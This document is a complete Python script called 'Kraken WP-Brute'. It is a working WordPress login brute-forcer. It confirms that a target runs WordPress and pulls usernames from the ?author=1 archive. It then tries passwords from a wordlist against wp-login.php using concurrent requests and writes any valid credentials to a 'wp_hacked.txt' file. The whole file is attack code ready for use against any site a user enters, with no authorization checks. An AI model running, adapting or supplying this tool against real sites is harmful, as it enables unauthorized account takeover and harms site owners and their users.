import os
import sys
import time
import requests
import re
import logging
from random import choice
from colorama import Fore, Style, init
import pyfiglet
import gevent
from gevent.pool import Pool
from gevent import monkey


monkey.patch_all(ssl=False)


init(autoreset=True)


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


script_dir = os.path.dirname(os.path.realpath(__file__))
results_dir = os.path.join(script_dir, 'Results')
logs_dir = os.path.join(script_dir, 'Logs')


os.makedirs(results_dir, exist_ok=True)
os.makedirs(logs_dir, exist_ok=True)


logging.basicConfig(filename=os.path.join(logs_dir, 'wp_brute.log'), 
                    level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def clear_console():
    """Clears the console window."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Displays the script banner with random color."""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    banner_color = choice(colors)
    banner = pyfiglet.figlet_format("Kraken WP-Brute", font="slant")
    print(Style.BRIGHT + banner_color + banner)
    print(Style.RESET_ALL + Fore.WHITE + "="*80 + "\n")

def status(msg):
    """Prints status messages."""
    print(Fore.CYAN + "[*] " + msg)

def success(msg):
    """Prints success messages."""
    print(Fore.GREEN + "[+] " + msg)

def error(msg):
    """Prints error messages."""
    print(Fore.RED + "[-] " + msg)

def validate_wp(site):
    """Validates if the site is a WordPress site."""
    status(f"Validating if {site} is a WordPress site...")
    try:
        r = requests.get(site, timeout=10)
        if 'wp-content' in r.text or '/wp-login.php' in r.text:
            success(f"{site} is confirmed as a WordPress site.")
            return True
        else:
            error(f"{site} is not a WordPress site.")
            logging.error(f"{site} is not a WordPress site.")
            sys.exit(1)
    except Exception as e:
        error(f"Error during validation: {str(e)}")
        logging.error(f"Validation error: {str(e)}")
        sys.exit(1)

def get_user_input():
    """Gathers user input for the WordPress brute force operation."""
    site = input(Fore.WHITE + '[i] Enter the target: ').strip()
    if not site.startswith(('http://', 'https://')):
        site = 'http://' + site

    status("Processing site input...")
    validate_wp(site)

    username = enumerate_username(site)
    if not username:
        use_list = input(Fore.WHITE + "[i] Use username list? (Y/n): " + Fore.RESET).strip().lower()
        if use_list != 'n':
            user_file = input(Fore.WHITE + "[i] Username list (default: users.txt, press Enter for default): " + Fore.RESET).strip() or os.path.join(script_dir, "..", "wordlists", "users.txt")
            status(f"Loading usernames from {user_file}...")
            if not os.path.isfile(user_file):
                error(f"Username list not found: {user_file}")
                logging.error(f"Username list not found: {user_file}")
                sys.exit(1)
            usernames = load_usernames(user_file)
            if not usernames:
                error("No usernames found in the list.")
                logging.error("No usernames found.")
                sys.exit(1)
            username = usernames[0]
            success(f"First username from the list selected: {username}")
        else:
            username = input(Fore.WHITE + "[i] Enter username : " + Fore.RESET).strip()
            if not username:
                error("No username provided.")
                logging.error("No username provided.")
                sys.exit(1)
            success(f"Username entered manually: {username}")
    else:
        
        success(f"Username found via enumeration: {username}")
        with open(os.path.join(results_dir, 'found_username.txt'), 'w') as user_file:
            user_file.write(f"Found username: {username}\n")

    pwd_file = input(Fore.WHITE + "[i] Password list (default: passwords.txt, press Enter for default): " + Fore.RESET).strip() or os.path.join(script_dir, "..", "wordlists", "passwords.txt")
    status(f"Loading passwords from {pwd_file}...")
    if not os.path.isfile(pwd_file):
        error(f"Password list not found: {pwd_file}")
        logging.error(f"Password list not found: {pwd_file}")
        sys.exit(1)

    threads = int(input(Fore.WHITE + "[i] Enter number of threads to use (default: 10, press Enter for default): ") or 10)

    status("All inputs received successfully.")
    print(Fore.YELLOW + "-"*60)
    print(Fore.YELLOW + Style.BRIGHT + "Starting brute-force attack...")
    return site, username, pwd_file, threads

def enumerate_username(site):
    """Attempts to enumerate username from the site."""
    status(f"Attempting to enumerate username from {site}...")
    try:
        r = requests.get(f'{site}/?author=1', timeout=10)
        if '/author/' in r.text:
            username = re.search(r'/author/(.*)/"', r.text).group(1)
            if '/feed' in username:
                username = re.search(r'/author/(.*)/feed/"', r.text).group(1)
            return username
        status(Fore.YELLOW + "Username enumeration failed.")
        return None
    except Exception as e:
        logging.error(f"Enumeration error: {str(e)}")
        return None

def load_usernames(file_path):
    """Loads usernames from the specified file."""
    status(f"Loading usernames from {file_path}...")
    with open(file_path, 'r', encoding='utf-8') as file:
        usernames = [line.strip() for line in file if line.strip()]
    success(f"{len(usernames)} usernames loaded.")
    return usernames

def load_passwords(password_file):
    """Loads passwords from the specified file."""
    status(f"Loading passwords from {password_file}...")
    with open(password_file, 'r', encoding='utf-8') as file:
        passwords = [line.strip() for line in file if line.strip()]
    success(f"{len(passwords)} passwords loaded.")
    return passwords

def attempt_login(site, username, password, wp_submit_value, wp_redirect_to, attempt_number, total_attempts, start_time):
    """Attempts to log in to the WordPress site using provided credentials."""
    agent = {'User-Agent': 'Mozilla/5.0'}
    post_data = {
        'log': username,
        'pwd': password,
        'wp-submit': wp_submit_value,
        'redirect_to': wp_redirect_to,
        'testcookie': 1
    }

    try:
        response = requests.post(site + '/wp-login.php', data=post_data, headers=agent, timeout=10)
        
        elapsed_time = time.time() - start_time
        percentage = (attempt_number / total_attempts) * 100
        estimated_total_time = elapsed_time / (attempt_number / total_attempts)
        remaining_time = estimated_total_time - elapsed_time
        time_remaining_str = time.strftime('%H:%M:%S', time.gmtime(remaining_time))

        if 'wordpress_logged_in_' in str(response.cookies):
            success_msg = (
                f"\n[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Estimated Remaining Time: {time_remaining_str} |"
                f" Current: {username}:{password}\n"
                f"\n{Fore.GREEN + Style.BRIGHT}SUCCESS!{Style.RESET_ALL} Valid credentials found!\n"
                f"{Fore.YELLOW}{'-'*40}\n"
                f"URL: {Fore.CYAN}{site}/wp-login.php{Style.RESET_ALL}\n"
                f"Username: {Fore.YELLOW}{username}{Style.RESET_ALL}\n"
                f"Password: {Fore.YELLOW}{password}{Style.RESET_ALL}\n"
                f"{Fore.YELLOW}{'-'*40}\n"
            )
            sys.stdout.write('\033[K')  
            print(success_msg)
            with open(os.path.join(results_dir, 'wp_hacked.txt'), 'a') as writer:
                writer.write(success_msg)
            return False  
        else:
            sys.stdout.write(Fore.MAGENTA + f"\r[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Estimated Remaining Time: {time_remaining_str} | Current: {username}:{password}" + " " * 10)
            sys.stdout.flush()
            return False  
    except Exception as e:
        logging.error(f"Login attempt error: {str(e)}")
        return False  

def run_bruteforce(site, username, passwords, wp_submit_value, wp_redirect_to, threads):
    """Runs brute-force attack with gevent-based concurrency using user-defined threads."""
    total_attempts = len(passwords)
    start_time = time.time()
    attempt_number = 0

    def worker(password):
        nonlocal attempt_number
        attempt_number += 1
        attempt_login(site, username, password, wp_submit_value, wp_redirect_to, attempt_number, total_attempts, start_time)

    pool = Pool(threads)  
    pool.map(worker, passwords)  

    
    sys.stdout.write('\n')
    print(Fore.GREEN + "\nBrute-force attack completed.")

def fetch_wp_values(site):
    """Fetches WordPress form values needed for login."""
    status(f"Fetching WordPress form values from {site}...")
    try:
        agent = {'User-Agent': 'Mozilla/5.0'}
        r = requests.get(site + '/wp-login.php', timeout=5, headers=agent)
        wp_submit_value = re.search(r'class="button button-primary button-large" value="(.*)"', r.text).group(1)
        wp_redirect_to = re.search(r'name="redirect_to" value="(.*)"', r.text).group(1)
        success("Form values fetched successfully.")
        return wp_submit_value, wp_redirect_to
    except Exception as e:
        error(f"Error fetching form values: {str(e)}")
        logging.error(f"Fetch error: {str(e)}")
        sys.exit(1)

def main():
    clear_console()
    display_banner()

    site, username, pwd_file, threads = get_user_input()
    wp_submit_value, wp_redirect_to = fetch_wp_values(site)

    passwords = load_passwords(pwd_file)
    print(Style.RESET_ALL + Fore.WHITE + "\n" + "="*80 + "\n")
    run_bruteforce(site, username, passwords, wp_submit_value, wp_redirect_to, threads)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logging.info("Script interrupted by user.")
        print(Fore.YELLOW + "Script interrupted by user.")
